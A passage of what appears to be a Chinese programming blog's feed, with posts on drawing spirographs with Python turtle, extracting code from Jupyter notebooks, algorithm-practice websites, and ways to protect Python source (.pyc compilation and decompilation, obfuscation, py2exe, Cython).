</span><br><span class="line">        self.l = l </span><br><span class="line">        self.col = col </span><br><span class="line">        <span class="hljs-comment"># reduce r/R to smallest form by dividing with GCD </span></span><br><span class="line">        gcdVal = gcd(self.r, self.R) </span><br><span class="line">        self.nRot = self.r//gcdVal </span><br><span class="line">        <span class="hljs-comment"># get ratio of radii </span></span><br><span class="line">        self.k = r/float(R) </span><br><span class="line">        <span class="hljs-comment"># set color </span></span><br><span class="line">        self.t.color(*col) </span><br><span class="line">        <span class="hljs-comment"># current angle </span></span><br><span class="line">        self.a = <span class="hljs-number">0</span></span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># restart drawing </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restart</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># set flag </span></span><br><span class="line">        self.drawingComplete = <span class="hljs-literal">False</span></span><br><span class="line">        <span class="hljs-comment"># show turtle </span></span><br><span class="line">        self.t.showturtle() </span><br><span class="line">        <span class="hljs-comment"># go to first point </span></span><br><span class="line">        self.t.up() </span><br><span class="line">        R, k, l = self.R, self.k, self.l </span><br><span class="line">        a = <span class="hljs-number">0.0</span></span><br><span class="line">        x = R*((<span class="hljs-number">1</span>-k)*math.cos(a) + l*k*math.cos((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        y = R*((<span class="hljs-number">1</span>-k)*math.sin(a) - l*k*math.sin((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        self.t.setpos(self.xc + x, self.yc + y) </span><br><span class="line">        self.t.down() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># draw the whole thing </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">draw</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># draw rest of points </span></span><br><span class="line">        R, k, l = self.R, self.k, self.l </span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">360</span>*self.nRot + <span class="hljs-number">1</span>, self.step): </span><br><span class="line">            a = math.radians(i) </span><br><span class="line">            x = R*((<span class="hljs-number">1</span>-k)*math.cos(a) + l*k*math.cos((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">            y = R*((<span class="hljs-number">1</span>-k)*math.sin(a) - l*k*math.sin((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">            self.t.setpos(self.xc + x, self.yc + y) </span><br><span class="line">        <span class="hljs-comment"># done - hide turtle </span></span><br><span class="line">        self.t.hideturtle() </span><br><span class="line">      </span><br><span class="line">    <span class="hljs-comment"># update by one step </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># skip if done </span></span><br><span class="line">        <span class="hljs-keyword">if</span> self.drawingComplete: </span><br><span class="line">            <span class="hljs-keyword">return</span></span><br><span class="line">        <span class="hljs-comment"># increment angle </span></span><br><span class="line">        self.a += self.step </span><br><span class="line">        <span class="hljs-comment"># draw step </span></span><br><span class="line">        R, k, l = self.R, self.k, self.l </span><br><span class="line">        <span class="hljs-comment"># set angle </span></span><br><span class="line">        a = math.radians(self.a) </span><br><span class="line">        x = self.R*((<span class="hljs-number">1</span>-k)*math.cos(a) + l*k*math.cos((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        y = self.R*((<span class="hljs-number">1</span>-k)*math.sin(a) - l*k*math.sin((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        self.t.setpos(self.xc + x, self.yc + y) </span><br><span class="line">        <span class="hljs-comment"># check if drawing is complete and set flag </span></span><br><span class="line">        <span class="hljs-keyword">if</span> self.a &gt;= <span class="hljs-number">360</span>*self.nRot: </span><br><span class="line">            self.drawingComplete = <span class="hljs-literal">True</span></span><br><span class="line">            <span class="hljs-comment"># done - hide turtle </span></span><br><span class="line">            self.t.hideturtle() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># clear everything </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        self.t.clear() </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># A class for animating spirographs </span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpiroAnimator</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># constructor </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, N)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># timer value in milliseconds </span></span><br><span class="line">        self.deltaT = <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-comment"># get window dimensions </span></span><br><span class="line">        self.width = turtle.window_width() </span><br><span class="line">        self.height = turtle.window_height() </span><br><span class="line">        <span class="hljs-comment"># create spiro objects </span></span><br><span class="line">        self.spiros = [] </span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(N): </span><br><span class="line">            <span class="hljs-comment"># generate random parameters </span></span><br><span class="line">            rparams = self.genRandomParams() </span><br><span class="line">            <span class="hljs-comment"># set spiro params </span></span><br><span class="line">            spiro = Spiro(*rparams) </span><br><span class="line">            self.spiros.append(spiro) </span><br><span class="line">        <span class="hljs-comment"># call timer </span></span><br><span class="line">        turtle.ontimer(self.update, self.deltaT) </span><br><span class="line">      </span><br><span class="line">    <span class="hljs-comment"># restart sprio drawing </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restart</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-keyword">for</span> spiro <span class="hljs-keyword">in</span> self.spiros: </span><br><span class="line">            <span class="hljs-comment"># clear </span></span><br><span class="line">            spiro.clear() </span><br><span class="line">            <span class="hljs-comment"># generate random parameters </span></span><br><span class="line">            rparams = self.genRandomParams() </span><br><span class="line">            <span class="hljs-comment"># set spiro params </span></span><br><span class="line">            spiro.setparams(*rparams) </span><br><span class="line">            <span class="hljs-comment"># restart drawing </span></span><br><span class="line">            spiro.restart() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># generate random parameters </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genRandomParams</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        width, height = self.width, self.height </span><br><span class="line">        R = random.randint(<span class="hljs-number">50</span>, min(width, height)//<span class="hljs-number">2</span>) </span><br><span class="line">        r = random.randint(<span class="hljs-number">10</span>, <span class="hljs-number">9</span>*R//<span class="hljs-number">10</span>) </span><br><span class="line">        l = random.uniform(<span class="hljs-number">0.1</span>, <span class="hljs-number">0.9</span>) </span><br><span class="line">        xc = random.randint(-width//<span class="hljs-number">2</span>, width//<span class="hljs-number">2</span>) </span><br><span class="line">        yc = random.randint(-height//<span class="hljs-number">2</span>, height//<span class="hljs-number">2</span>) </span><br><span class="line">        col = (random.random(), </span><br><span class="line">               random.random(), </span><br><span class="line">               random.random()) </span><br><span class="line">        <span class="hljs-keyword">return</span> (xc, yc, col, R, r, l) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># update all spiros </span></span><br><span class="line">        nComplete = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> spiro <span class="hljs-keyword">in</span> self.spiros: </span><br><span class="line">            <span class="hljs-comment"># update </span></span><br><span class="line">            spiro.update() </span><br><span class="line">            <span class="hljs-comment"># count completed ones </span></span><br><span class="line">            <span class="hljs-keyword">if</span> spiro.drawingComplete: </span><br><span class="line">                nComplete+= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-comment"># if all spiros are complete, restart </span></span><br><span class="line">        <span class="hljs-keyword">if</span> nComplete == len(self.spiros): </span><br><span class="line">            self.restart() </span><br><span class="line">        <span class="hljs-comment"># call timer </span></span><br><span class="line">        turtle.ontimer(self.update, self.deltaT) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># toggle turtle on/off </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toggleTurtles</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-keyword">for</span> spiro <span class="hljs-keyword">in</span> self.spiros: </span><br><span class="line">            <span class="hljs-keyword">if</span> spiro.t.isvisible(): </span><br><span class="line">                spiro.t.hideturtle() </span><br><span class="line">            <span class="hljs-keyword">else</span>: </span><br><span class="line">                spiro.t.showturtle() </span><br><span class="line">              </span><br><span class="line"><span class="hljs-comment"># save spiros to image </span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">saveDrawing</span><span class="hljs-params">()</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># hide turtle </span></span><br><span class="line">    turtle.hideturtle() </span><br><span class="line">    <span class="hljs-comment"># generate unique file name </span></span><br><span class="line">    dateStr = (datetime.now()).strftime(<span class="hljs-string">"%d%b%Y-%H%M%S"</span>) </span><br><span class="line">    fileName = <span class="hljs-string">'spiro-'</span> + dateStr </span><br><span class="line">    print(<span class="hljs-string">'saving drawing to %s.eps/png'</span> % fileName) </span><br><span class="line">    <span class="hljs-comment"># get tkinter canvas </span></span><br><span class="line">    canvas = turtle.getcanvas() </span><br><span class="line">    <span class="hljs-comment"># save postscipt image </span></span><br><span class="line">    canvas.postscript(file = fileName + <span class="hljs-string">'.eps'</span>) </span><br><span class="line">    <span class="hljs-comment"># use PIL to convert to PNG </span></span><br><span class="line">    img = Image.open(fileName + <span class="hljs-string">'.eps'</span>) </span><br><span class="line">    img.save(fileName + <span class="hljs-string">'.png'</span>, <span class="hljs-string">'png'</span>) </span><br><span class="line">    <span class="hljs-comment"># show turtle </span></span><br><span class="line">    turtle.showturtle() </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># main() function </span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># use sys.argv if needed </span></span><br><span class="line">    print(<span class="hljs-string">'generating spirograph...'</span>) </span><br><span class="line">    <span class="hljs-comment"># create parser </span></span><br><span class="line">    descStr = <span class="hljs-string">"""This program draws spirographs using the Turtle module. </span></span><br><span class="line"><span class="hljs-string">    When run with no arguments, this program draws random spirographs. </span></span><br><span class="line"><span class="hljs-string">      </span></span><br><span class="line"><span class="hljs-string">    Terminology: </span></span><br><span class="line"><span class="hljs-string">  </span></span><br><span class="line"><span class="hljs-string">    R: radius of outer circle. </span></span><br><span class="line"><span class="hljs-string">    r: radius of inner circle. </span></span><br><span class="line"><span class="hljs-string">    l: ratio of hole distance to r. </span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=descStr) </span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># add expected arguments </span></span><br><span class="line">    parser.add_argument(<span class="hljs-string">'--sparams'</span>, nargs=<span class="hljs-number">3</span>, dest=<span class="hljs-string">'sparams'</span>, required=<span class="hljs-literal">False</span>, </span><br><span class="line">                        help=<span class="hljs-string">"The three arguments in sparams: R, r, l."</span>) </span><br><span class="line">                          </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># parse args </span></span><br><span class="line">    args = parser.parse_args() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set to 80% screen width </span></span><br><span class="line">    turtle.setup(width=<span class="hljs-number">0.8</span>) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set cursor shape </span></span><br><span class="line">    turtle.shape(<span class="hljs-string">'turtle'</span>) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set title </span></span><br><span class="line">    turtle.title(<span class="hljs-string">"Spirographs!"</span>) </span><br><span class="line">    <span class="hljs-comment"># add key handler for saving images </span></span><br><span class="line">    turtle.onkey(saveDrawing, <span class="hljs-string">"s"</span>) </span><br><span class="line">    <span class="hljs-comment"># start listening </span></span><br><span class="line">    turtle.listen() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># hide main turtle cursor </span></span><br><span class="line">    turtle.hideturtle() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># checks args and draw </span></span><br><span class="line">    <span class="hljs-keyword">if</span> args.sparams: </span><br><span class="line">        params = [float(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> args.sparams] </span><br><span class="line">        <span class="hljs-comment"># draw spirograph with given parameters </span></span><br><span class="line">        <span class="hljs-comment"># black by default </span></span><br><span class="line">        col = (<span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>) </span><br><span class="line">        spiro = Spiro(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, col, *params) </span><br><span class="line">        spiro.draw() </span><br><span class="line">    <span class="hljs-keyword">else</span>: </span><br><span class="line">        <span class="hljs-comment"># create animator object </span></span><br><span class="line">        spiroAnim = SpiroAnimator(<span class="hljs-number">4</span>) </span><br><span class="line">        <span class="hljs-comment"># add key handler to toggle turtle cursor </span></span><br><span class="line">        turtle.onkey(spiroAnim.toggleTurtles, <span class="hljs-string">"t"</span>) </span><br><span class="line">        <span class="hljs-comment"># add key handler to restart animation </span></span><br><span class="line">        turtle.onkey(spiroAnim.restart, <span class="hljs-string">"space"</span>) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># start turtle main loop </span></span><br><span class="line">    turtle.mainloop() </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># call main </span></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>: </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>实现效果：</p><img src="https://s2.ax1x.com/2019/11/09/MeyR1S.png" alt="MeyR1S.png" border="0">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;旋转描记器是一种几何绘图玩具，可产生各种技术上称为下摆线和下摆线的数学轮盘曲线。它是由英国工程师Denys Fisher开发的，于1965年首次出售。该名称是1998年Hasbro 公司（Hasbro Inc.）的注册商标，此前该公司 收购了Denys Fisher公司。Spirograph品牌于2013年由Kahootz Toys在全球范围内重新推出其原始产品配置，旋描仪可用于绘制各种分形。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="旋转描记器" scheme="http://yoursite.com/tags/%E6%97%8B%E8%BD%AC%E6%8F%8F%E8%AE%B0%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>提取ipynb文件中的py代码</title>
    <link href="http://yoursite.com/2019/11/08/%E6%8F%90%E5%8F%96ipynb%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84py%E4%BB%A3%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/08/提取ipynb文件中的py代码/</id>
    <published>2019-11-08T13:07:53.000Z</published>
    <updated>2019-11-08T13:13:44.882Z</updated>
    
    <content type="html"><![CDATA[<p>.ipynb是Anaconda3中Jupyter Notebook的文件格式，非常方便Python教学，在科学计算和数据分析等领域使用较多。在Jupyter Notebook中，使用菜单File==&gt;Download as==&gt;Python(.py)可以直接另存为.py文件，但是如果已经存在.ipynb文件该怎么去获得python代码呢？</p><a id="more"></a><p>当我们利用记事本打开.ipynb文件时，会发现文件的格式跟json文件是一样的。这样的话可以使用Python标准库json进行解析，然后提取其中的Python代码。</p><p>参考代码：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> open(<span class="hljs-string">"你的文件名称.ipynb"</span>,encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> fp:</span><br><span class="line">    content = json.load(fp)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> open(<span class="hljs-string">"保存的文件名称.py"</span>,<span class="hljs-string">"w"</span>,encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> fp:</span><br><span class="line">    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content[<span class="hljs-string">"cells"</span>]:</span><br><span class="line">        fp.writelines([i.rstrip()+<span class="hljs-string">"\n"</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> item[<span class="hljs-string">"source"</span>]])</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;.ipynb是Anaconda3中Jupyter Notebook的文件格式，非常方便Python教学，在科学计算和数据分析等领域使用较多。在Jupyter Notebook中，使用菜单File==&amp;gt;Download as==&amp;gt;Python(.py)可以直接另存为.py文件，但是如果已经存在.ipynb文件该怎么去获得python代码呢？&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="提取ipynb文件" scheme="http://yoursite.com/tags/%E6%8F%90%E5%8F%96ipynb%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>算法刷题网站</title>
    <link href="http://yoursite.com/2019/11/08/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/"/>
    <id>http://yoursite.com/2019/11/08/算法刷题网站/</id>
    <published>2019-11-08T12:42:15.000Z</published>
    <updated>2019-11-08T12:58:32.343Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直想刷题，经过苦苦寻找，找到了以下几个较好的平台，然后记录在这里吧。</p><a id="more"></a><h1 id="一、收割offer版"><a href="#一、收割offer版" class="headerlink" title="一、收割offer版"></a>一、收割offer版</h1><h2 id="1-力扣"><a href="#1-力扣" class="headerlink" title="1.力扣"></a>1.力扣</h2><p>英文网址：<a href="https://leetcode.com/" target="_blank" rel="noopener">https://leetcode.com/</a></p><p>中文网址：<a href="https://leetcode-cn.com/" target="_blank" rel="noopener">https://leetcode-cn.com/</a></p><p>估计 leetcode（力扣）大家都很熟悉了，都被推荐烂了，很多国内外的程序员在上面刷题，难度从 Easy、Medium 至 Hard 都有，据说很多面试官都会从中挑选各种题目，号称大厂的筛码工。</p><h2 id="2-hihoCoder"><a href="#2-hihoCoder" class="headerlink" title="2.hihoCoder"></a>2.hihoCoder</h2><p>网址：<a href="https://hihocoder.com" target="_blank" rel="noopener">https://hihocoder.com</a></p><p>网站的技术团队来自于原北大 POJ 的开发团队，至于 POJ 会在后面的篇章中介绍，反正膜拜就完事了。一些知名的大厂比如微软、百度、腾讯、网易等会在上面举办在线编程比赛，风格倒是和 ACM 比赛类似。</p><h2 id="3-牛客网"><a href="#3-牛客网" class="headerlink" title="3.牛客网"></a>3.牛客网</h2><p>网址：<a href="https://www.nowcoder.com/" target="_blank" rel="noopener">https://www.nowcoder.com/</a></p><p>牛客网作为国内内容超级丰富的 IT 题库，各种东西看的我眼花缭乱，题库+面试+学习+求职+讨论 360 度无死角服务，堪称”互联网求职神器”。它好就好在不只是一个刷题的平台，还是一个交流学习的平台，发个问题贴总有热心的大佬帮助。</p><h2 id="计蒜客"><a href="#计蒜客" class="headerlink" title="计蒜客"></a>计蒜客</h2><p>网址：<a href="https://www.jisuanke.com/" target="_blank" rel="noopener">https://www.jisuanke.com/</a></p><p>计蒜客这个网站可能很多人不知道，它也有可以刷题的题库，也会定期举办比赛。</p><h1 id="二、ACM-竞赛版"><a href="#二、ACM-竞赛版" class="headerlink" title="二、ACM 竞赛版"></a>二、ACM 竞赛版</h1><h2 id="1-HDU"><a href="#1-HDU" class="headerlink" title="1.HDU"></a>1.HDU</h2><p>网址：<a href="http://acm.hdu.edu.cn/" target="_blank" rel="noopener">http://acm.hdu.edu.cn/</a></p><p>杭电（杭州电子科技大学）的 OJ 大概是国内最火的几个 OJ 之一了，大多数 ACMer 应该都知道（其实我想说所有来着），勿需多说，非常多比赛都在上面，比如每年暑假的多校联赛，朝鲜、外蒙等学校的队伍都会参加，想不知道都不可能。</p><h2 id="2-POJ"><a href="#2-POJ" class="headerlink" title="2.POJ"></a>2.POJ</h2><p>网址：<a href="http://poj.org/" target="_blank" rel="noopener">http://poj.org/</a></p><p>POJ（Peking University Online Judge）,同样作为国内最火的几大 OJ 之一，它的建立时间更早，一些上古时期的题目也能在上面找到，同样 POJ 也很出名。</p><h2 id="3-SDUT"><a href="#3-SDUT" class="headerlink" title="3.SDUT"></a>3.SDUT</h2><p>网址：<a href="https://acm.sdut.edu.cn/" target="_blank" rel="noopener">https://acm.sdut.edu.cn/</a></p><h2 id="4-其它-OJ"><a href="#4-其它-OJ" class="headerlink" title="4.其它 OJ"></a>4.其它 OJ</h2><p>最后附带一些其它同样优秀的 OJ 平台：</p><p><strong>国内：</strong></p><p>ZJU（浙大）: <a href="https://zoj.pintia.cn/home" target="_blank" rel="noopener">https://zoj.pintia.cn/home</a></p><p>USTC（中科大）：<a href="http://acm.ustc.edu.cn/ustcoj/" target="_blank" rel="noopener">http://acm.ustc.edu.cn/ustcoj/</a></p><p>FZU（福大）：<a href="http://acm.fzu.edu.cn/" target="_blank" rel="noopener">http://acm.fzu.edu.cn/</a></p><p>HIT（哈工大）：<a href="http://acm.hit.edu.cn/" target="_blank" rel="noopener">http://acm.hit.edu.cn/</a></p><p><strong>国外：</strong></p><p>URAL：<a href="http://acm.timus.ru/" target="_blank" rel="noopener">http://acm.timus.ru/</a></p><p>SPOJ：<a href="https://www.spoj.com/" target="_blank" rel="noopener">https://www.spoj.com/</a></p><h1 id="三、提高版"><a href="#三、提高版" class="headerlink" title="三、提高版"></a>三、提高版</h1><h2 id="1-Codeforces"><a href="#1-Codeforces" class="headerlink" title="1.Codeforces"></a>1.Codeforces</h2><p>网址：<a href="https://codeforces.com/" target="_blank" rel="noopener">https://codeforces.com/</a></p><p>Codeforces 又被戏称为 CF，是一家俄罗斯的网站，当然还是用英文食用。这里的很好的比赛，很好的题目，很好的选手，简称”三好”。</p><h2 id="2-Topcoder"><a href="#2-Topcoder" class="headerlink" title="2.Topcoder"></a>2.Topcoder</h2><p>网址：<a href="https://www.topcoder.com/" target="_blank" rel="noopener">https://www.topcoder.com/</a></p><p>Topcoder 据说是世界上规模最大的编程网站，如果这样的话那这个 Top 就可以理解了，Top 的 coder。</p><h1 id="四、写在最后"><a href="#四、写在最后" class="headerlink" title="四、写在最后"></a>四、写在最后</h1><p><strong>刷题不要单纯的为了追求做题的数量，还是要以学会为目的，并且学以致用。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直想刷题，经过苦苦寻找，找到了以下几个较好的平台，然后记录在这里吧。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="算法刷题" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>对自己的python代码加密</title>
    <link href="http://yoursite.com/2019/11/05/%E5%AF%B9%E8%87%AA%E5%B7%B1%E7%9A%84python%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86/"/>
    <id>http://yoursite.com/2019/11/05/对自己的python代码加密/</id>
    <published>2019-11-05T14:04:28.000Z</published>
    <updated>2019-11-08T13:14:18.472Z</updated>
    
    <content type="html"><![CDATA[<p>由于 Python 的动态特性和开源特点，导致 Python 代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种或加密、或混淆的方案，借此来达到保护源码的目的。</p><a id="more"></a><p>常见的源码保护手段有如下几种：</p><ol><li><p>发行.pyc文件</p></li><li><p>代码混淆</p></li><li><p>使用py2exe</p></li><li><p>使用Cython</p></li></ol><p>下面来简单说说这些方案。</p><h2 id="1-发行-pyc-文件"><a href="#1-发行-pyc-文件" class="headerlink" title="1.发行.pyc 文件"></a>1.发行.pyc 文件</h2><p><strong>生产.pyc文件</strong>：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m compileall 文件名称</span><br></pre></td></tr></table></figure><p><strong>解密.pyc文件</strong>：</p><p>首先安装<strong>uncompyle6</strong> 库，然后在同文件下执行：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o . 文件名</span><br></pre></td></tr></table></figure><p><strong>批量解密.pyc文件</strong>：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># encoding=utf8</span></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> uncompyle6</span><br><span class="line"><span class="hljs-keyword">from</span> uncompyle6 <span class="hljs-keyword">import</span> decompile_file</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    path = <span class="hljs-string">'C:\filename'</span>.decode(<span class="hljs-string">'utf8'</span>)        <span class="hljs-comment"># Windows下</span></span><br><span class="line">    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="hljs-keyword">if</span> root != path:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> files:</span><br><span class="line">            <span class="hljs-keyword">if</span> filename.endswith(<span class="hljs-string">'pyc'</span>):</span><br><span class="line">                <span class="hljs-keyword">print</span> filename</span><br><span class="line">                os.system(<span class="hljs-string">'uncompyle6 -o . %s'</span>%filename)</span><br><span class="line">    </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>优点：</p><ul><li><p>简单方便，提高了一点源码破解门槛</p></li><li><p>平台兼容性好，.py能在哪里运行，.pyc就能在哪里运行</p></li></ul><p>不足：</p><ul><li><p>解释器兼容性差，.pyc只能在特定版本的解释器上运行</p></li><li><p>有现成的反编译工具，破解成本低</p></li></ul><h2 id="2-代码混淆"><a href="#2-代码混淆" class="headerlink" title="2.代码混淆"></a>2.代码混淆</h2><ul><li><p>网站混淆：<a href="http://pyob.oxyry.com/" target="_blank" rel="noopener">http://pyob.oxyry.com/</a></p></li><li><p>使用 pyobfuscate 库进行混淆</p></li></ul><p>优点：</p><ul><li>简单方便，提高了一点源码破解门槛</li><li>兼容性好，只要源码逻辑能做到兼容，混淆代码亦能</li></ul><p>不足：</p><ul><li>只能对单个文件混淆，无法做到多个互相有联系的源码文件的联动混淆</li><li>代码结构未发生变化，也能获取字节码，破解难度不大</li></ul><h2 id="3-使用py2exe"><a href="#3-使用py2exe" class="headerlink" title="3.使用py2exe"></a>3.使用py2exe</h2><p>py2exe 是一款将 Python 脚本转换为 Windows 平台上的可执行文件的工具。其原理是将源码编译为.pyc文件，加之必要的依赖文件，一起打包成一个可执行文件。</p><p>使用py2exe进行打包的步骤较为简便。</p><p>1）编写入口文件。本示例中取名为hello.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print 'Hello World'</span><br></pre></td></tr></table></figure><p>2）编写setup.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line"></span><br><span class="line">setup(console=['hello.py'])</span><br></pre></td></tr></table></figure><p>3）生成可执行文件</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py py2exe</span><br></pre></td></tr></table></figure><p>生成的可执行文件位于dist\hello.exe</p><p>优点：</p><ul><li><p>能够直接打包成 exe，方便分发和执行</p></li><li><p>破解门槛比 .pyc 更高一些</p></li></ul><p>不足：</p><ul><li><p>兼容性差，只能运行在 Windows 系统上</p></li><li><p>生成的可执行文件内的布局是明确、公开的，可以找到源码对应的.pyc文件，进而反编译出源码</p></li></ul><h2 id="4-使用-Cython"><a href="#4-使用-Cython" class="headerlink" title="4.使用 Cython"></a>4.使用 Cython</h2><p>使用Cython进行开发的步骤也不复杂。</p><p>1）编写文件hello.pyx或hello.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def hello():</span><br><span class="line">    print('hello')</span><br></pre></td></tr></table></figure><p>2）编写setup.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 